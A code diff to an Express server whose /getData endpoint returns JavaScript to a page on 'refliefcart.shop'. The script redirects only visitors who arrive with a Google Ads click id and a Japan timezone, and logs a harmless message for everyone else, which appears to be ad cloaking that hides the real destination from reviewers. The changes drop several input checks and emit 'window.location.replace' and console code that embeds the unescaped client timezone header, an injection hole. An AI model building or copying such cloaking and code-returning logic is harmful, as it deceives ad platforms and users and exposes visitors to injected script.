@@ -4,10 +4,8 @@ const app = express();
 
 const FINAL_REDIRECT_URL = "https://example.com";
 const JAPAN_TIMEZONE = "Asia/Tokyo";
-const ALLOWED_ORIGIN = "https://refliefcart.shop";
 
-/* ------------------ Helpers ------------------ */
-
+// ✅ GCLID validation helper (ADDED)
 function isValidGclid(gclid) {
   return (
     typeof gclid === "string" &&
@@ -17,59 +15,46 @@ function isValidGclid(gclid) {
   );
 }
 
-/* ------------------ CORS ------------------ */
-
+// ✅ CORS middleware (required for fetch)
 app.use((req, res, next) => {
-  res.setHeader("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
+  res.setHeader("Access-Control-Allow-Origin", "https://refliefcart.shop");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-client-timezone");
-  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
-  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, private");
+  res.setHeader("Access-Control-Allow-Methods", "GET");
   next();
 });
 
-app.options("/getData", (req, res) => {
-  return res.sendStatus(204);
-});
-
-/* ------------------ Route ------------------ */
-
 app.get("/getData", (req, res) => {
-  const rawGclid = req.query.gclid;
+  const gclid = req.query.gclid || "";
   const timezone = req.headers["x-client-timezone"] || "";
-  const country =
-    req.headers["cf-ipcountry"] || // Cloudflare
-    req.headers["x-vercel-ip-country"] || // Vercel
-    "";
 
-  // Reject array-based attacks
-  if (Array.isArray(rawGclid)) {
-    return res.json({ code: `console.log("No redirect: invalid gclid");` });
-  }
-
-  const gclid = String(rawGclid || "").trim();
-
-  // ❌ Invalid gclid
-  if (!isValidGclid(gclid)) {
-    return res.json({ code: `console.log("No redirect: invalid gclid");` });
-  }
-
-  // ❌ Not Japan
-  if (country !== "JP" || timezone !== JAPAN_TIMEZONE) {
+  // ❌ No gclid → no redirect
+  if (!gclid) {
     return res.json({
-      code: `console.log("No redirect: country=${country}, timezone=${timezone}");`
+      code: `console.log("No redirect: gclid missing");`
     });
   }
 
-  // ✅ Redirect
-  const redirectUrl =
-    `${FINAL_REDIRECT_URL}?gclid=${encodeURIComponent(gclid)}`;
+  // ❌ Invalid gclid (ADDED)
+  if (!isValidGclid(gclid)) {
+    return res.json({
+      code: `console.log("No redirect: invalid gclid");`
+    });
+  }
+
+  // ❌ Not Japan → no redirect
+  if (timezone !== JAPAN_TIMEZONE) {
+    return res.json({
+      code: `console.log("No redirect: timezone =", "${timezone}");`
+    });
+  }
+
+  // ✅ Redirect (gclid + Japan timezone)
+  const redirectUrl = `${FINAL_REDIRECT_URL}?gclid=${encodeURIComponent(gclid)}`;
 
   return res.json({
-    redirect: redirectUrl
+    code: `window.location.replace("${redirectUrl}");`
   });
 });
-
-/* ------------------ Server ------------------ */
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
